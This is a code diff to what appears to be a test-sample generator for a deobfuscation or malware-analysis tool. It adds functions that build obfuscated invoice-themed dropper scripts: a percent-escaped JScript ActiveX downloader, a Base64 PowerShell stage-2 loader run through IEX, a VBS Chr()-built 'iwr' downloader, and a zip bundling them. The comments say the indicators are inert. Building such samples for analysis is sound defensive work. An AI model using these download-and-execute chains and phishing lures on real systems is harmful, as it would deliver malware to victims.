@@ -554,6 +554,67 @@ def velvet_xlsm() -> bytes:
     return _encrypt_ooxml(excel(".xlsm"), "VelvetSweatshop")
 
 
+# --- standalone obfuscated scripts (deobfuscation demos) ------------------------------
+# Dropped/attached scripts that only reveal their intent once deobfuscated — one per
+# engine, so uploading each shows the "deobfuscate first, then analyse" path. All inert:
+# the recovered payloads reference the same *.example / TEST-NET campaign indicators.
+
+# The JScript the dropper runs once decoded (ActiveX download + PowerShell stage 2).
+_JS_PAYLOAD = (
+    'var x=new ActiveXObject("MSXML2.XMLHTTP");'
+    f'x.open("GET","{PAYLOAD_URL}",false);x.send();'
+    'var sh=new ActiveXObject("WScript.Shell");'
+    f'sh.Run("powershell -nop -w hidden -enc {PS_B64}",0);'
+)
+
+
+def obf_js() -> bytes:
+    """A .js whose whole body is ``eval(unescape("%..%.."))`` — the reference
+    case: one long run of percent escapes the multi-pass decoder must peel."""
+    pct = "".join("%%%02x" % b for b in _JS_PAYLOAD.encode())
+    body = ("// Factura 2026-0187 - visor seguro (no editar)\n"
+            f'eval(unescape("{pct}"));\n')
+    return body.encode()
+
+
+def stage2_ps1() -> bytes:
+    """A .ps1 stage-2 loader hidden behind backticks + Base64 (FromBase64String)."""
+    b64 = base64.b64encode(PS_STAGE.encode("utf-8")).decode()
+    body = (
+        "# Factura 2026-0187 - actualizador (stage 2)\n"
+        "$ErrorActionPreference = 'SilentlyContinue'\n"
+        f"I`E`X ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64}')))\n"
+    )
+    return body.encode()
+
+
+def dropper_vbs() -> bytes:
+    """A .vbs that builds the stage-2 URL from Chr() codes and runs PowerShell
+    through an Execute() wrapper — exercises Chr/concat/Execute deobfuscation."""
+    chr_url = "&".join("Chr(%d)" % b for b in STAGE2_URL.encode())
+    body = (
+        "' Factura 2026-0187 - adjunto\n"
+        "Dim u\n"
+        f"u = {chr_url}\n"
+        'Execute("CreateObject(""WScript.Shell"").Run ""powershell -nop -w hidden -c iwr "" & u, 0, False")\n'
+    )
+    return body.encode()
+
+
+def dropper_bundle_zip() -> bytes:
+    """A plain .zip bundling the three obfuscated scripts, to exercise the
+    nested (recursive) deobfuscation path: each child is deobfuscated on its own."""
+    import io
+    import zipfile
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("factura_visor.js", obf_js())
+        zf.writestr("actualizador.ps1", stage2_ps1())
+        zf.writestr("factura.pdf.vbs", dropper_vbs())
+    return buf.getvalue()
+
+
 # --- main -----------------------------------------------------------------------------
 
 def build_all() -> dict[str, bytes]:
@@ -562,6 +623,8 @@ def build_all() -> dict[str, bytes]:
         "sample.dotx": word_dotx(), "sample.dotm": word_dotm(),
         "sample.rtf": rtf_doc(), "sample.pdf": pdf_doc(),
         "sample.eml": eml_doc(), "sample.emlx": emlx_doc(), "sample.msg": msg_doc(),
+        "sample_dropper.js": obf_js(), "sample_stage2.ps1": stage2_ps1(),
+        "sample_dropper.vbs": dropper_vbs(), "lab/dropper_bundle.zip": dropper_bundle_zip(),
     }
     for ext in X_CT:
         out[f"sample{ext}"] = excel(ext)
